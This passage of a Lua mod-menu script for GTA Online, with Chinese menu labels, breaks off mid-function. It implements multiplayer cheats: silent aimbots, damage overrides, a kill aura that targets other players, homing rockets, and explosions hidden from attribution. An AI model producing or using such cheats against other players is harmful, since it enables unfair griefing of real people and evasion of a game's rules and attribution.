            if (DoesTableContainValue(EntityManipulationHandleList, entityHandle)) then util.toast("实体已在列表中!") return end
            EntityManipulationHandleList[#EntityManipulationHandleList+1] = entityHandle

            --if we shoot a car, it gives us the ped driving. So why not include the car as well?
            if (ENTITY.IS_ENTITY_A_PED(entityHandle) and PED.IS_PED_IN_ANY_VEHICLE(entityHandle, false)) then
                local veh = PED.GET_VEHICLE_PED_IS_IN(entityHandle, false)
                local mlistBufferVeh = makeListForEntity(entityManipulation, veh)
                funcsForEntity(EntityManipulationHandleList, mlistBufferVeh, veh)
            end

            --make the list with the functions
            local mListBuffer = makeListForEntity(entityManipulation, entityHandle)
            funcsForEntity(EntityManipulationHandleList, mListBuffer, entityHandle)

            --make the tick handler so that it deletes list when entity is deleted
            --tysm Zack#1307 for fixing my error w/ the tick handler!
            util.create_tick_handler(function() return doesEntityExist(EntityManipulationHandleList, mListBuffer, entityHandle) end)
            if (SE_Notifications) then util.toast("添加实体!") end
        end
    end
end)

menu.toggle_loop(weapon_options, "磁铁枪", {"magnetgun"}, "", function ()
    magnetgun()
end)

menu.slider_text(weapon_options, "设置磁铁枪", {}, "", {"平滑的", "混沌模式"}, function(index)
	setmagnetgun(index)
end)

menu.toggle_loop(weapon_options, "磁铁实体", {"magnetents"}, "射击两个实体以让它们互相吸引", function()
	ctst()
end, function ()
	counter = 0
	shotEntities = {}; entityPairs = {}
end)

grapplegun = false
menu.toggle(weapon_options, "绳索枪", {}, "" , function(on)
    grapplegun = on
    if on then
        WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), util.joaat('weapon_pistol'), 9999, false, false)
        notification("绳索枪现已激活！ 用手枪射击某处。 擒抱时按 R 可停止擒抱。", colors.blue)
    end
end)

MarkedForExt = {}
MarkedForExtCount = 1
----
menu.toggle_loop(weapon_options, "删除枪", {}, "", function ()
    local localPed = GetLocalPed()
    if PED.IS_PED_SHOOTING(localPed) then
        local point = memory.alloc(4)
        local isEntFound = PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), point)
        if isEntFound then
            local entt = memory.read_int(point)
            if ENTITY.IS_ENTITY_A_PED(entt) and PED.IS_PED_IN_ANY_VEHICLE(entt) then
                local pedVeh = PED.GET_VEHICLE_PED_IS_IN(entt, false)
                local maxPassengers = VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(pedVeh) - 1
                for i = -1, maxPassengers do
                    local seatFree = VEHICLE.IS_VEHICLE_SEAT_FREE(pedVeh, i, false)
                    if not seatFree then
                        local targetPed = VEHICLE.GET_PED_IN_VEHICLE_SEAT(pedVeh, i, false)
                        MarkedForExt[MarkedForExtCount] = targetPed
                        if SE_Notifications then
                            util.toast("标记为删除! 测量 " .. MarkedForExtCount)
                        end
                        MarkedForExtCount = MarkedForExtCount + 1
                    end
                end
                MarkedForExt[MarkedForExtCount] = pedVeh
                if SE_Notifications then
                    util.toast("标记为删除! 测量 " .. MarkedForExtCount)
                end
                MarkedForExtCount = MarkedForExtCount + 1
            else
                MarkedForExt[MarkedForExtCount] = entt
                if SE_Notifications then
                    util.toast("标记为删除! 测量 " .. MarkedForExtCount)
                end
                MarkedForExtCount = MarkedForExtCount + 1
            end
        end
        memory.free(point)
    end
end)

PROX_Coords = {}
PROX_Count = 1

menu.toggle_loop(weapon_options, "感应地雷枪", {"proxgun"}, "仅适用于坐标, 不是实体.", function ()
    local localped = GetLocalPed()
    if PED.IS_PED_SHOOTING(localped) then --check if we shooting
        local pointer = memory.alloc() --allocate memory for coords
        local junk = WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(localped, pointer) --get pointer to coord
        local coord = memory.read_vector3(pointer) --get coord (read from pointer)
        if coord.x ~= 0.0 and coord.y ~= 0.0 and coord.z ~= 0.0 then --check for dud (if we didn't register the shot)
            PROX_Coords[PROX_Count] = coord --assign coord to table
            PROX_Count = PROX_Count + 1 --make the counter go up
            if SE_Notifications then
                util.toast("感应地雷放在 " .. coord.x .. " " .. coord.y .. " " .. coord.z)
            end
        end
        memory.free(pointer) --free the memory so we don't bruh moment the script
    end
end)



menu.toggle_loop(weapon_options, "启用/禁用感应地雷", {"enableprox", "proxon"}, "让感应地雷检查实体是否在它们旁边.", function ()
    if PROX_Coords ~= nil then
        for i = 1, #PROX_Coords do
            local pedTable = entities.get_all_peds_as_handles()
            for a = 1, #pedTable do
                if ENTITY.IS_ENTITY_IN_AREA(pedTable[a], PROX_Coords[i].x + 2, PROX_Coords[i].y + 2, PROX_Coords[i].z, PROX_Coords[i].x - 2, PROX_Coords[i].y - 2, PROX_Coords[i].z + 2, true, true, true) then
                    SE_add_owned_explosion(GetLocalPed(), PROX_Coords[i].x, PROX_Coords[i].y, PROX_Coords[i].z, 2, 10, true, false, 0.4)
                end
            end
        end
    end
end)

menu.action(weapon_options, "清理所有感应地雷", {"clearprox"}, "", function ()
    util.toast("已清理掉所有 " .. #PROX_Coords .. " 感应地雷!")
    PROX_Coords = {}
    PROX_Count = 1
end)

menu.action(weapon_options, "删除", {}, "", function ()
    for i = 1, #MarkedForExt, 1 do
        entities.delete_by_handle(MarkedForExt[i])
    end
    MarkedForExt = {}
    MarkedForExtCount = 1
    -- resets the extinction
    if SE_Notifications then
        util.toast("清理所有被标记的实体...")
    end
end)
menu.action(weapon_options, "清理删除列表", {}, "", function ()
    MarkedForExt = {}
    MarkedForExtCount = 1
end)

gun_stealer = false
menu.toggle(weapon_options, "偷车枪", {}, "射击车辆以窃取它, 如果是带有玩家司机的汽车,它会将您传送到下一个可用座位.", function(on)
    gun_stealer = on
end)

menu.toggle_loop(weapon_options, "射出NPC", {""}, "随机NPC(威力很大)", function()
    shechuNPC()
end)

drivergun = false
menu.toggle(weapon_options, "NPC驾驶枪", {}, "射击车辆以插入一个NPC司机，该司机会将车辆开到一个随机区域。 由于实体所有权，您可能需要多射击几次。", function(on)
    drivergun = on
end)

menu.toggle(weapon_options, "隐形武器", {}, "使你的武器隐形。 可能仅限本地。 切换武器时需要重新开启。", function(on)
    local plyr = players.user_ped()
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(plyr, not on, false, false, false) 
end)

menu.toggle_loop(weapon_options, "彩虹武器", {""}, "", function()
    local plyr = players.user_ped()
    if start_tint == nil then
        start_tint = WEAPON.GET_PED_WEAPON_TINT_INDEX(plyr, WEAPON.GET_SELECTED_PED_WEAPON(plyr))
        cur_tint = start_tint
    end
    cur_tint = if cur_tint == 8 then 0 else cur_tint + 1
    WEAPON.SET_PED_WEAPON_TINT_INDEX(plyr,WEAPON.GET_SELECTED_PED_WEAPON(plyr), cur_tint)
    util.yield(50)
end, function()
        WEAPON.SET_PED_WEAPON_TINT_INDEX(players.user_ped(),WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()), start_tint)
        start_tint = nil
end)

aim_info = false
menu.toggle(weapon_options,"实体信息", {""}, "", function(on)
    aim_info = on
end)

menu.toggle_loop(weapon_options, "彩弹枪", {"攻击车辆变颜色"}, "攻击车辆变颜色", function ()
    caidancargun()
end)

menu.toggle_loop(weapon_options, "空袭枪", {"airstrikegun"}, "", function()
    airstgun()
end)

menu.toggle_loop(weapon_options, "子弹更改器", {"bulletchanger"}, "", function ()
    bulletchanger()
end)

menu.list_select(weapon_options, "设置武器子弹", {}, "", {
	{util.get_label_text("WT_A_RPG")}, {util.get_label_text("WT_FWRKLNCHR")},
	{util.get_label_text("WT_RAYPISTOL")}, {util.get_label_text("WT_GL")},
	{util.get_label_text("WT_MOLOTOV")}, {util.get_label_text("WT_SNWBALL")},
	{util.get_label_text("WT_FLAREGUN")}, {util.get_label_text("WT_EMPL")},}, 1, function(opt)
        bulletchanger_set(opt)
end)


local hitEffectRoot <const> = menu.list(Gun_Effect_Shooting_Hit, "命中效果", {}, "")

menu.toggle_loop(hitEffectRoot, "命中效果", {"hiteffects"}, "", function()
	hittingeffect()
end)

menu.list_select(hitEffectRoot, "设置效果", {}, "", hiteffectchinese, 1, function (opt)
	sethiteffect(opt)
end)

local SetEffectColour = function(colour) effectColour = colour end

local menuColour = menu.colour(hitEffectRoot, "颜色", {"effectcolour"}, "仅对某些效果有效", effectColour, false, SetEffectColour)
menu.rainbow(menuColour)


menu.toggle(weapon_options, '友好枪', {'JSfriendlyFire'}, '使您射击NPC时让他们不会攻击您.', function(toggle)
    friendshipgun(toggle)
end)

menu.toggle_loop(weapon_options, '热成像枪', {'JSthermalGuns'}, '当您瞄准时按"E"可以启用热成像功能.', function()
    thermalgun()
end)

menu.toggle_loop(weapon_options, '超级冲锋', {}, '使用近战时将附近模型推开', function ()
	supeerrunning()
end)

menu.toggle(weapon_options, "女武神火箭", {"valkrocket"}, "", function(toggle)
    rocketgo(toggle)
end)

menu.action(weapon_options, "发射引导导弹", {"missile"}, "", function()
	if not UFO.exists() then GuidedMissile.create() end
end)

menu.toggle(weapon_options, "可以射击队友", {}, '使你在游戏中能够射击队友', function(toggle)
    PED.SET_CAN_ATTACK_FRIENDLY(PLAYER.PLAYER_PED_ID(), toggle, false)
end)

menu.toggle_loop(weapon_options, '翻滚时自动换弹夹', {}, '当你做翻滚动作时更换弹夹', function()
    runreload()
end)

menu.toggle(weapon_options, "无限弹药", { "inf_ammo" }, '可以避免子弹过多的检测', function(toggle)
    unlimitedbullet(toggle)
end)

menu.toggle_loop(weapon_options, "锁定弹药", { "lock_ammo" }, "锁定当前武器为最大弹药", function()
    lockthebullet()
end)

menu.divider(pvphelp, "静默自瞄")

local silent_aimbotroot = menu.list(pvphelp, "静默自瞄1.0", {"lancescriptsilentaimbot"}, "")

menu.toggle(silent_aimbotroot, "静默自瞄", {"saimbottoggle"}, "", function(on) SE_Notifications = true
    silent_aimbot = on
    start_silent_aimbot()
end)

menu.toggle_loop(silent_aimbotroot, "最大自瞄范围", {}, "手柄的辅助瞄准功能开启后，将有无限的范围.", function()
    PLAYER.SET_PLAYER_LOCKON_RANGE_OVERRIDE(players.user(), 99999999.0)
end)

menu.toggle(silent_aimbotroot, "静默自瞄玩家", {"saimbotplayers"}, "", function(on)
    satarget_players = on
end)

menu.toggle(silent_aimbotroot, "静默自瞄NPC\'s", {"saimbotpeds"}, "", function(on)
    satarget_npcs = on
end)

menu.toggle(silent_aimbotroot, "用视野指定范围", {"saimbotusefov"}, "你不会通过你的屁眼杀人", function(on)
    satarget_usefov = on
end)

menu.slider(silent_aimbotroot, "视野", {"saimbotfov"}, "", 1, 270, 180, 1, function(s)
    sa_fov = s
end)

menu.toggle(silent_aimbotroot, "忽略车内目标", {"saimbotnovehicles"}, "如果你想装的更像个正常人, 或者射车内目标时遇到问题", function(on)
    satarget_novehicles = on
end)

satarget_nogodmode = true
menu.toggle(silent_aimbotroot, "忽略无敌目标", {"saimbotnogodmodes"}, "因为这有什么意义？", function(on)
    satarget_nogodmode = on
end, true)

menu.toggle(silent_aimbotroot, "好友成为目标", {"saimbottargetfriends"}, "", function(on)
    satarget_targetfriends = on
end)

menu.toggle(silent_aimbotroot, "伤害修改", {"saimbotdmgo"}, "", function(on)
    satarget_damageo = on
end)

menu.slider(silent_aimbotroot, "伤害修改的数值", {"saimbotdamageoverride"}, "", 1, 1000, 100, 1, function(s)
    sa_odmg = s
end)

menu.toggle_loop(pvphelp, "静默自瞄2.0", {}, "", function ()
    if PED.IS_PED_SHOOTING(GetLocalPed()) then --main start, checking.
        Silent_Aimbot.hash = WEAPON.GET_SELECTED_PED_WEAPON(GetLocalPed())
        local suitable = GetSuitableAimbotTarget(Silent_Aimbot.fov, Silent_Aimbot.fov_check,
            Silent_Aimbot.dist, Silent_Aimbot.los_check)

        if suitable ~= nil then
            local hitboxesCheckCount = 0
            for i, v in pairs(Silent_Aimbot.hitboxes) do
                if (v.toggled) then
                    ShootBulletAtPedBone(suitable, v.hash, Silent_Aimbot.dmg,
                        Silent_Aimbot.hash, Silent_Aimbot.advanced.speed)
                        if SE_Notifications then util.toast("射击 " .. i .. " 玩家的 " .. GetPlayerName_ped(suitable)) end
                        break;
                else
                    hitboxesCheckCount = hitboxesCheckCount + 1
                end
            end
            if (hitboxesCheckCount == 3) then
                util.toast("没有选择打击点")
            end
        end
    end
end)

    zhunxin = menu.list(pvphelp, "准星", {}, "", function(); end)
menu.toggle_loop(zhunxin, "瞄准准星 (!)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("!")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.4798,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (#)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("#")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.4798,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 ($)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("$")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.4798,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (^)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("^")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.486,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (&)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("&")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.4798,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (*)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("*")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.485,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (+)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("+")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.4999,0.477,0)
end)

menu.toggle_loop(zhunxin, "瞄准准星 (·)", {''}, '', function()
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(0)
    HUD.SET_TEXT_CENTRE(1)
    HUD.SET_TEXT_OUTLINE(0)
    HUD.SET_TEXT_COLOUR(255, 0, 0, 180)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("·")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.49997,0.478,0)
end)


local aimbot_settings = menu.list(pvphelp, "静默自瞄2.0设置", {}, "")
menu.divider(aimbot_settings, "---Settings---")
menu.slider(aimbot_settings, "伤害", {"saimdmg", "silentdamage"}, "伤害。 可能不准确。", 1, 10000, 100, 10, function (v) Silent_Aimbot.dmg = v end)
menu.slider(aimbot_settings, "范围", {"saimrange", "silentrange"}, "静默自瞄范围", 1, 10000, 300, 100, function (v) Silent_Aimbot.dist = v end)
menu.slider(aimbot_settings, "视野", {"saimfov", "silentfov"}, "静默自瞄视野", 1, 1000, 20, 1, function (v) Silent_Aimbot.fov = v/10 end)
menu.toggle(aimbot_settings, "视野检查", {}, "禁用视野检查。", function (toggle) Silent_Aimbot.fov_check = toggle end, true)
menu.toggle(aimbot_settings, "视线检查", {}, "禁用视线检查。", function (toggle) Silent_Aimbot.los_check = toggle end, true)
menu.divider(aimbot_settings, "---打击点---")
menu.toggle(aimbot_settings, "头", {"saimhead", "silenthead"}, "切换头部打击点。", function (toggle) Silent_Aimbot.hitboxes.head.toggled = toggle end)
menu.toggle(aimbot_settings, "脊柱/身体", {"saimspine", "saimbody", "silentbody"}, "切换身体打击点。", function (toggle) Silent_Aimbot.hitboxes.spine.toggled = toggle end)
menu.toggle(aimbot_settings, "骨盆", {"saimpelvis", "silentpelvis"}, "切换骨盆打击点。", function (toggle) Silent_Aimbot.hitboxes.pelvis.toggled = toggle end)
menu.divider(aimbot_settings, "---额外功能---")
menu.slider(aimbot_settings, "设定速度", {"silentspeed"}, "设置子弹的速度。 默认值为 -1。", -1, 2147483647, -1, 10, function (v) Silent_Aimbot.advanced.speed = v end)

menu.divider(pvphelp, "天基炮")

--preload
ORB_Sneaky = false

menu.action(pvphelp, "天基炮射击标记点", {"orbway", "orbwp"}, "标点之后再使用，否则不起作用并且报错", function ()
    local wpos = HUD.GET_BLIP_COORDS(blip)
    if SE_Notifications then
        util.toast("所选标记点目标: " .. wpos.x .. " " .. wpos.y .. " " .. wpos.z)
    end
    if ORB_Sneaky then
        for a = 1, 30 do
            SE_add_explosion(wpos.x, wpos.y, wpos.z + 30 - a, 29, 10, true, false, 1, false)
            SE_add_explosion(wpos.x, wpos.y, wpos.z + 30 - a, 59, 10, true, false, 1, false)
            wait(30)
        end
    else
        for i = 1, 30 do
            SE_add_owned_explosion(GetLocalPed(), wpos.x, wpos.y, wpos.z + 30 - i, 29, 10, true, false, 1)
            SE_add_owned_explosion(GetLocalPed(), wpos.x, wpos.y, wpos.z + 30 - i, 59, 10, true, false, 1)
            wait(30)
        end
    end
end)

menu.toggle(pvphelp, "隐秘的爆炸", {}, "天基炮的爆炸不会归咎于你.", function (on)
    ORB_Sneaky = on
end)

menu.divider(pvphelp, "自爆卡车")

--preload
CAR_S_sneaky = false
CAR_S_BLACKLIST = {}

menu.toggle_loop(pvphelp, "自动载具自毁", {"carexplode"}, "当你在玩家旁边时会自动引爆你的车.", function()
    local ourped = GetLocalPed()
    if PED.IS_PED_IN_ANY_VEHICLE(ourped, false) then
        local pedTable = entities.get_all_peds_as_pointers()
        local ourCoords = getEntityCoords(ourped)
        for i = 1, #pedTable do
            local handle = entities.pointer_to_handle(pedTable[i])
            if PED.IS_PED_A_PLAYER(handle) then
                local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)
                local v3 = entities.get_position(pedTable[i])
                local dist = DistanceBetweenTwoCoords(ourCoords, v3)
                if dist < 5 and handle ~= GetLocalPed() and not CAR_S_BLACKLIST[playerID] then
                    if CAR_S_sneaky then
                        SE_add_explosion(ourCoords.x, ourCoords.y, ourCoords.z, 2, 10, true, false, 0.1, false)
                        SE_add_explosion(ourCoords.x - 4, ourCoords.y, ourCoords.z, 2, 20, false, true, 0.1, false)
                        SE_add_explosion(ourCoords.x + 4, ourCoords.y, ourCoords.z, 2, 20, false, true, 0.1, false)
                        SE_add_explosion(ourCoords.x, ourCoords.y - 4, ourCoords.z, 2, 20, false, true, 0.1, false)
                        SE_add_explosion(ourCoords.x, ourCoords.y + 4, ourCoords.z, 2, 20, false, true, 0.1, false)
                    else
                        SE_add_owned_explosion(ourped, ourCoords.x, ourCoords.y, ourCoords.z, 2, 10, true, false, 0.1)
                        SE_add_owned_explosion(ourped, ourCoords.x - 4, ourCoords.y, ourCoords.z, 2, 20, false, true, 0.1)
                        SE_add_owned_explosion(ourped, ourCoords.x + 4, ourCoords.y, ourCoords.z, 2, 20, false, true, 0.1)
                        SE_add_owned_explosion(ourped, ourCoords.x, ourCoords.y - 4, ourCoords.z, 2, 20, false, true, 0.1)
                        SE_add_owned_explosion(ourped, ourCoords.x, ourCoords.y + 4, ourCoords.z, 2, 20, false, true, 0.1)
                    end
                end
            end
        end
    end
end)

menu.toggle(pvphelp, "隐秘的载具自毁", {"carexplodesneaky"}, "汽车自毁的爆炸不会归咎于你.", function(on)
    CAR_S_sneaky = on
end)

menu.divider(pvphelp,"杀死光环")

local kill_auraroot = menu.list(pvphelp, "杀死光环", {}, "杀死任何离你太近的人.就像被黑客入侵的Minecraft客户端一样.")

kill_aura = false
menu.toggle(kill_auraroot, "杀死光环", {},  "杀死任何离你太近的人.就像被黑客入侵的Minecraft客户端一样.", function(on)
    kill_aura = on
    mod_uses("ped", if on then 1 else -1)
end)

kill_aura_peds = false
menu.toggle(kill_auraroot, "杀死peds", {}, "", function(on)
    kill_aura_peds = on
end)

kill_aura_players = false
menu.toggle(kill_auraroot, "杀死玩家", {}, "", function(on)
    kill_aura_players = on
end)

kill_aura_friends = false
menu.toggle(kill_auraroot, "目标好友", {}, "", function(on)
    kill_aura_friends= on
end)


kill_aura_dist = 20
menu.slider(kill_auraroot, "杀死光环范围", {}, "", 1, 100, 20, 1, function(s)
    kill_aura_dist = s
end)

peds_thread = util.create_thread(function (thr)
    while true do
        if ped_uses > 0 then
            all_peds = entities.get_all_peds_as_handles()
            for k,ped in pairs(all_peds) do
                if kill_aura then
                    if (kill_aura_peds and not PED.IS_PED_A_PLAYER(ped)) or (kill_aura_players and PED.IS_PED_A_PLAYER(ped)) then
                        local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(v)
                        local hdl = pid_to_handle(pid)
                        if (kill_aura_friends and not NETWORK.NETWORK_IS_FRIEND(hdl)) or not kill_aura_friends then
                            target = ENTITY.GET_ENTITY_COORDS(ped, false)
                            m_coords = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
                            if MISC.GET_DISTANCE_BETWEEN_COORDS(m_coords.x, m_coords.y, m_coords.z, target.x, target.y, target.z, true) < kill_aura_dist and ENTITY.GET_ENTITY_HEALTH(ped) > 0 then
                                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z'], target['x'], target['y'], target['z']+0.1, 300.0, true, 100416529, players.user_ped(), true, false, 100.0)
                            end
                        end
                    end
                end
            end
        end
        util.yield()
    end
end)

menu.divider(pvphelp,"车辆瞄准器")

menu.toggle_loop(pvphelp, "直升飞机自动瞄准器", {}, "使直升机瞄准最近的玩家。 将其与“静默自瞄”结合使用，让您看起来超级棒 :)", function ()
    local p = GetClosestPlayerWithRange_Whitelist(200)
    local localped = GetLocalPed()
    local localcoords2 = ENTITY.GET_ENTITY_COORDS(localped)
    if p ~= nil and not PED.IS_PED_DEAD_OR_DYING(p) and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(localped, p, 17) and not AIM_WHITELIST[NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p)] and (not players.is_in_interior(NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p))) and (not players.is_godmode(NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p))) then
        if PED.IS_PED_IN_ANY_VEHICLE(localped) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
            if VEHICLE.GET_VEHICLE_CLASS(veh) == 15 or VEHICLE.GET_VEHICLE_CLASS(veh) == 16 then --vehicle class of heli
                --did all prechecks, time to actually face them
                -- local pcoords = PED.GET_PED_BONE_COORDS(p, 24817, 0, 0, 0)
                -- local look = util.v3_look_at(localCoords, pcoords) --x = pitch (vertical), y = roll (fuck no), z = heading (horizontal)
                local pcoords2 = PED.GET_PED_BONE_COORDS(p, 24817, 0, 0, 0)
                local look2 = v3.lookAt(localcoords2, pcoords2)
                local look = GetTableFromV3Instance(look2)
                ENTITY.SET_ENTITY_ROTATION(veh, look.x, look.y, look.z, 1, true)
            end
        end
    end
end)

menu.action(pvphelp, "修改导弹速度", {}, "", function ()
    local localped = GetLocalPed()
    if PED.IS_PED_IN_ANY_VEHICLE(localped) then
        local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
        if VEHICLE.GET_VEHICLE_CLASS(veh) == 15 or VEHICLE.GET_VEHICLE_CLASS(veh) == 16 then --vehicle class of heli
            SetVehicleMissileSpeed(VEH_MISSILE_SPEED)
        end
    end
end)

menu.slider(pvphelp, "设置导弹速度", {"vehmissilespeed"}, "设置导弹的速度。", 1, 2147483647, 10000, 100, function (value)
    VEH_MISSILE_SPEED = value
end)

menu.divider(pvphelp, "RPG自动瞄准器")


menu.toggle(pvphelp, "RPG自动瞄准器/大多数车辆", {"rpgaim"}, "更准确地说，火箭自瞄。 将与火箭设置列表中提供的火箭一起使用。 默认为 RPG。", function (on)
    if on then
        MISL_AIM = true
        while MISL_AIM do
            local localped = GetLocalPed()
            local localcoords = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
            local forOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(localped, 0, 5, 0)
            RRocket = OBJECT.GET_CLOSEST_OBJECT_OF_TYPE(forOffset.x, forOffset.y, forOffset.z, 10, Chosen_Rocket_Hash, false, true, true, true)
            local p
            if missile_settings.multitarget then
                if missile_settings.air_target then
                    p = GetClosestPlayerWithRange_Whitelist_DisallowEntities(missile_settings.radius, MISSILE_ENTITY_TABLE, true)
                else
                    p = GetClosestPlayerWithRange_Whitelist_DisallowEntities(missile_settings.radius, MISSILE_ENTITY_TABLE, false)
                end
            elseif missile_settings.multiped then
                if missile_settings.air_target then
                    p = GetClosestNonPlayerPedWithRange_DisallowedEntities(missile_settings.radius, MISSILE_ENTITY_TABLE, true)
                else
                    p = GetClosestNonPlayerPedWithRange_DisallowedEntities(missile_settings.radius, MISSILE_ENTITY_TABLE, false)
                end
            elseif not missile_settings.multitarget then
                if missile_settings.air_target then
                    p = GetClosestPlayerWithRange_Whitelist(missile_settings.radius, true)
                else
                    p = GetClosestPlayerWithRange_Whitelist(missile_settings.radius, false)
                end
            end
            local ppcoords = ENTITY.GET_ENTITY_COORDS(p)
            ----
            if (RRocket ~= 0) and (p ~= nil) and (not PED.IS_PED_DEAD_OR_DYING(p)) and (not AIM_WHITELIST[NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p)]) and (PED.IS_PED_SHOOTING(localped)) and (not players.is_in_interior(NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p))) and (ppcoords.z > 1) then
                util.create_thread(function ()
                    local plocalized = p
                    local msl = RRocket
                    if missile_settings.multitarget then
                        MISSILE_ENTITY_TABLE[#MISSILE_ENTITY_TABLE+1] = plocalized
                    end
                    if (ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(localped, plocalized, 17) and missile_settings.los) or not missile_settings.los or MISL_AIR then
                        if SE_Notifications then
                            util.toast("前兆完成！")
                        end
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(msl)
                        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(msl) then
                            for i = 1, 10 do
                                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(msl)
                            end
                        else
                            if SE_Notifications then
                                util.toast("有控制权")
                            end
                        end
                        local aircount = 1
                        ----
                        Missile_Camera = 0

                        --preload the fake rocket and the particle fx
                        -- > -- Load the particleFX for the fakerocket so it networks to other players
                        STREAMING.REQUEST_NAMED_PTFX_ASSET(missile_particles.dictionary)
                        while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(missile_particles.dictionary) do
                            STREAMING.REQUEST_NAMED_PTFX_ASSET(missile_particles.dictionary)
                            util.yield()
                        end
                        GRAPHICS.USE_PARTICLE_FX_ASSET(missile_particles.dictionary)
                        -- > -- we now have loaded our PTFX for our fake rocket.
                        --GRAPHICS.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY("exp_grd_rpg_lod", msl, 0, 0, 0, 0, 0, 0, 2, false, false, false)
                        --while the rocket exists, we do this vvvv
                        while ENTITY.DOES_ENTITY_EXIST(msl) do
                            if SE_Notifications then
                                util.toast("rocket exists")
                            end
                            -- NEW CODE W/O DEPRECATION:
                            --local pcoords2 = v3.new(PED.GET_PED_BONE_COORDS(plocalized, 20781, 0, 0, 0))
                            local pcoords2 = ENTITY.GET_ENTITY_COORDS(plocalized)
                            local pcoords = GetTableFromV3Instance(pcoords2)
                            local lc2 = ENTITY.GET_ENTITY_COORDS(msl)
                            local lc = GetTableFromV3Instance(lc2)
                            local look2 = v3.lookAt(lc2, pcoords2)
                            local look = GetTableFromV3Instance(look2)
                            local dir2 = v3.toDir(look2)
                            local dir = GetTableFromV3Instance(dir2)
                            --didn't wanna make new fuckin variables/replace old ones, so we're multiplying the code by 2 because fuck you.
                            -- // -- // --
                            -- // -- // --
                            if missile_settings.ptfx then
                                STREAMING.REQUEST_NAMED_PTFX_ASSET(missile_particles.dictionary)
                                while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(missile_particles.dictionary) do
                                    STREAMING.REQUEST_NAMED_PTFX_ASSET(missile_particles.dictionary)
                                    util.yield()
                                end
